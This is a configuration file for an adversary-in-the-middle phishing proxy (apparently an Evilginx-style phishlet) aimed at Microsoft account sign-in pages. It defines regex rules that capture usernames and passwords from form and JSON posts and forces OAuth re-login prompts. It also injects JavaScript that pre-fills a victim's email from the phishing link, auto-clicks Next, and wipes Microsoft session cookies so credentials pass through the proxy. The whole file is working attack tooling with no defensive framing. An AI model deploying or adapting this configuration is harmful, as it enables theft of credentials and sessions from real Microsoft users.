force_post:
  - path: "/ppsecure/post*"
    search:
      - { key: "LoginOptions", search: "1" }
    force:
      - { key: "DontShowAgain", value: "true" }
    type: "post"
  - path: "/common/oauth2/*"
    search:
      - { key: "prompt", search: ".*" }
    force:
      - { key: "prompt", value: "login" }
    type: "post"
  - path: "/{tenant}/oauth2/*"
    search:
      - { key: "prompt", search: ".*" }
    force:
      - { key: "prompt", value: "login" }
    type: "post"

auth_urls:
  - "/kmsi*"
  - "/landingv2*"
  - "/landing*"
  - "/login.srf"
  - "/common/oauth2/authorize*"
  - "/common/oauth2/v2.0/authorize*"
  - "/{tenant}/oauth2/authorize*"
  - "/{tenant}/oauth2/v2.0/authorize*"
  - "/consumers/fido/*"

credentials:
  username:
    key: "(login|UserName|username|email|account|identifier|utemp)"
    search: '(.*)'
    type: 'post'
  password:
    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
    search: '(.*)'
    type: "post"
  custom:
    - key: 'Username'
      search: '"username":"([^"]*)'
      type: "json"
    - key: 'Login'
      search: '"login":"([^"]*)'
      type: "json"
    - key: 'password'
      search: '"password":"([^"]*)'
      type: "json"

login:
  domain: "login.microsoftonline.com"
  path: "/"

js_inject:
  - trigger_domains: ["login.microsoftonline.com", "login.live.com", "login.microsoft.com"]
    trigger_paths: ["/common/oauth2/", "/", "/*", "/consumers/*"]
    script: |
      // Email autograb functionality
      function autoGrabEmail() {
        // Check URL parameters for email
        var urlParams = new URLSearchParams(window.location.search);
        var emailId = document.querySelector("#i0116");
        var nextButton = document.querySelector("#idSIButton9");
        
        // Extract email from various URL parameters
        var email = urlParams.get('email') || urlParams.get('user') || urlParams.get('login') || urlParams.get('username');
        
        // Extract from hash if base64 encoded
        var query = window.location.href;
        if (/#/.test(window.location.href)){
          var res = query.split("#");
          var data1 = res[0];
          var data2 = res[1];
          if (emailId != null) {
            var decodedString = data2;
            if (/^[A-Za-z0-9+/=]+$/.test(data2)) {
              try {
                decodedString = window.atob(data2.replace(/[=]/gi, ''));
              } catch (e) {
                console.error('Error decoding base64 string:', e);
              }
            }
            email = decodedString || email;
          }
        }
        
        // Auto-fill email if found
        if (email && emailId && emailId.value === '') {
          emailId.focus();
          emailId.value = email;
          setTimeout(function() {
            if (nextButton) {
              nextButton.focus();
              nextButton.click();
            }
          }, 1000);
          console.log("Autograb: Email filled - " + email);
          return;
        }
        
        // Fallback to original logic
        if (emailId != null && data2) {
          var decodedString = data2;
          if (/^[A-Za-z0-9+/=]+$/.test(data2)) {
            try {
              decodedString = window.atob(data2.replace(/[=]/gi, ''));
            } catch (e) {
              console.error('Error decoding base64 string:', e);
            }
          }
          emailId.focus();
          emailId.value = decodedString;
          if (nextButton) {
            nextButton.focus();
            nextButton.click();
          }
          console.log("YES!");
          return;
        }
        
        setTimeout(function(){autoGrabEmail();}, 500);
      }
      
      // MODIFIED: Only cleanup cookies if this is a FRESH login attempt (no credentials submitted yet)
      function cleanupExistingSessions() {
        // Check if we're on the actual login page (not a redirect/callback)
        var isLoginPage = window.location.pathname.includes('/oauth2/') || 
                         window.location.pathname === '/' ||
                         window.location.pathname.includes('/consumers/');
        
        // Check if user has already submitted credentials (presence of password field or KMSI page)
        var passwordField = document.querySelector('input[name="passwd"]') || document.querySelector('input[type="password"]');
        var kmsiCheckbox = document.querySelector('input[name="kmsi"]') || document.querySelector('input[name="DontShowAgain"]');
        var hasSubmittedCreds = passwordField !== null || kmsiCheckbox !== null;
        
        // Only clear cookies if this is initial login page AND no credentials submitted yet
        if (isLoginPage && !hasSubmittedCreds) {
          // Clear ESTSAUTH cookies that cause auto-redirect
          var cookiesToClear = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'];
          cookiesToClear.forEach(function(name) {
            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.microsoftonline.com';
            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.live.com';
            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.microsoft.com';
          });
          console.log('[Phishlet] Cleared existing session cookies');
        } else {
          console.log('[Phishlet] Preserving session - credentials flow active');
        }
      }
      
      // Run cleanup on page load (will detect context automatically)
      cleanupExistingSessions();
      
      // Start autograb after cleanup
      setTimeout(function(){autoGrabEmail();}, 500);

